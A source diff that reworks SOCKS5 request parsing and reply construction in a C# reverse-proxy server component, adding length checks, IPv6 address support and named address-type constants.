@@ -3,6 +3,8 @@ using Pulsar.Server.Networking;
 using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Linq;
+using System.Net;
 using System.Net.Sockets;
 using System.Text;
 
@@ -209,8 +211,8 @@ namespace Pulsar.Server.ReverseProxy
                 case 1:
                     {
                         //Socks command
-                        int MinPacketLen = 6;
-                        if (payload.Length >= MinPacketLen)
+                        const int headerLength = 4;
+                        if (payload.Length >= headerLength)
                         {
                             if (!CheckProxyVersion(payload))
                                 return;
@@ -219,9 +221,43 @@ namespace Pulsar.Server.ReverseProxy
                             this._isBindCommand = payload[1] == 2;
                             this._isUdpCommand = payload[1] == 3;
 
-                            this._isIpType = payload[3] == 1;
-                            this._isDomainNameType = payload[3] == 3;
-                            this._isIPv6NameType = payload[3] == 4;
+                            byte addressType = payload[3];
+                            this._isIpType = addressType == SOCKS5_ADDRTYPE_IPV4;
+                            this._isDomainNameType = addressType == SOCKS5_ADDRTYPE_DOMAIN_NAME;
+                            this._isIPv6NameType = addressType == SOCKS5_ADDRTYPE_IPV6;
+
+                            int addressLength;
+                            int addressOffset = headerLength;
+
+                            if (_isIpType)
+                            {
+                                addressLength = 4;
+                            }
+                            else if (_isIPv6NameType)
+                            {
+                                addressLength = 16;
+                            }
+                            else if (_isDomainNameType)
+                            {
+                                if (payload.Length < headerLength + 1)
+                                {
+                                    break;
+                                }
+
+                                addressLength = payload[4];
+                                addressOffset = headerLength + 1;
+                            }
+                            else
+                            {
+                                SendFailToClient();
+                                return;
+                            }
+
+                            int minimumLength = addressOffset + addressLength + 2;
+                            if (payload.Length < minimumLength)
+                            {
+                                break;
+                            }
 
                             Array.Reverse(payload, payload.Length - 2, 2);
                             this.TargetPort = BitConverter.ToUInt16(payload, payload.Length - 2);
@@ -232,12 +268,18 @@ namespace Pulsar.Server.ReverseProxy
                                 {
                                     this.TargetServer = payload[4] + "." + payload[5] + "." + payload[6] + "." + payload[7];
                                 }
+                                else if (_isIPv6NameType)
+                                {
+                                    var ipv6Bytes = new byte[16];
+                                    Array.Copy(payload, headerLength, ipv6Bytes, 0, 16);
+                                    this.TargetServer = new IPAddress(ipv6Bytes).ToString();
+                                }
                                 else if (_isDomainNameType)
                                 {
                                     int domainLen = payload[4];
-                                    if (MinPacketLen + domainLen < payload.Length)
+                                    if (headerLength + 1 + domainLen + 2 <= payload.Length)
                                     {
-                                        this.TargetServer = Encoding.ASCII.GetString(payload, 5, domainLen);
+                                        this.TargetServer = Encoding.ASCII.GetString(payload, headerLength + 1, domainLen);
                                     }
                                 }
 
@@ -372,12 +414,50 @@ namespace Pulsar.Server.ReverseProxy
                         //Thanks to http://www.mentalis.org/soft/projects/proxy/ for the Maths
                         try
                         {
-                            List<byte> responsePacket = new List<byte>();
-                            responsePacket.Add(SOCKS5_VERSION_NUMBER);
-                            responsePacket.Add(SOCKS5_CMD_REPLY_SUCCEEDED);
-                            responsePacket.Add(SOCKS5_RESERVED);
-                            responsePacket.Add(1);
-                            responsePacket.AddRange(response.LocalAddress);
+                            var responsePacket = new List<byte>
+                            {
+                                SOCKS5_VERSION_NUMBER,
+                                SOCKS5_CMD_REPLY_SUCCEEDED,
+                                SOCKS5_RESERVED
+                            };
+
+                            var addressBytes = response.LocalAddress ?? Array.Empty<byte>();
+                            byte addressType = SOCKS5_ADDRTYPE_IPV4;
+
+                            if (addressBytes.Length == 16)
+                            {
+                                addressType = SOCKS5_ADDRTYPE_IPV6;
+                            }
+                            else if (addressBytes.Length != 4)
+                            {
+                                addressType = SOCKS5_ADDRTYPE_DOMAIN_NAME;
+                            }
+
+                            responsePacket.Add(addressType);
+
+                            if (addressType == SOCKS5_ADDRTYPE_DOMAIN_NAME)
+                            {
+                                var hostname = (response.HostName ?? string.Empty).Trim();
+                                var hostBytes = Encoding.ASCII.GetBytes(hostname);
+                                byte hostLength = (byte)Math.Min(255, hostBytes.Length);
+                                responsePacket.Add(hostLength);
+                                responsePacket.AddRange(hostBytes.Take(hostLength));
+                            }
+                            else
+                            {
+                                if (addressType == SOCKS5_ADDRTYPE_IPV4 && addressBytes.Length != 4)
+                                {
+                                    addressBytes = new byte[4];
+                                }
+
+                                if (addressType == SOCKS5_ADDRTYPE_IPV6 && addressBytes.Length != 16)
+                                {
+                                    addressBytes = new byte[16];
+                                }
+
+                                responsePacket.AddRange(addressBytes);
+                            }
+
                             responsePacket.Add((byte)(Math.Floor((decimal)response.LocalPort / 256)));
                             responsePacket.Add((byte)(response.LocalPort % 256));
 
@@ -392,7 +472,7 @@ namespace Pulsar.Server.ReverseProxy
                                 SOCKS5_VERSION_NUMBER,
                                 SOCKS5_CMD_REPLY_SUCCEEDED,
                                 SOCKS5_RESERVED,
-                                1, //static: it's always 1
+                                SOCKS5_ADDRTYPE_IPV4,
                                 0, 0, 0, 0, //bind ip
                                 0, 0 //bind port
                             });
